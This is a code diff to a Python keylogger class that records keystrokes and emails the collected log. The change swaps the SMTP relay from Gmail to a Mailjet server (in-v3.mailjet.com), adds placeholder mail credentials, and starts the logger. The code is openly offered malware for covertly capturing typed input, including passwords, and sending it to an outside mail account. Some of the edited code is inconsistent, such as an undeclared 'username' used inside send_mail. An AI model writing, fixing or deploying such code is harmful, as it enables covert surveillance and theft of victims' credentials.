@@ -47,11 +47,11 @@ class KeyLogger:
         self.appendlog(current_key)
 
     def send_mail(self, email, password, message):
-        server = smtplib.SMTP('smtp.gmail.com', 587, message.encode("utf8"))
-        server.starttls()
-        server.login(email, password)
-        server.sendmail(email, email, message)
-        server.quit()
+        s = smtplib.SMTP('in-v3.mailjet.com', 587, message.encode("utf8"))
+        s.starttls()
+        s.login(username, password)
+        s.sendmail(email, email, message)
+        s.quit()
 
     def report(self):
         self.send_mail(self.email, self.password, "\n\n" + self.log)
@@ -117,5 +117,10 @@ class KeyLogger:
                 print('File is close.')
 
 
-keylogger = KeyLogger(10, 'MAIL', 'PASSWORD')
+# TEMP MAIL API (LOOK READ.ME)
+email_address = "YOUR MAIL"
+username = "YOUR USERNAME (MD5)"
+password= "YOUR PASSWORD (MD5)"
+
+keylogger = KeyLogger(10, email_address, username, password)
 keylogger.run()
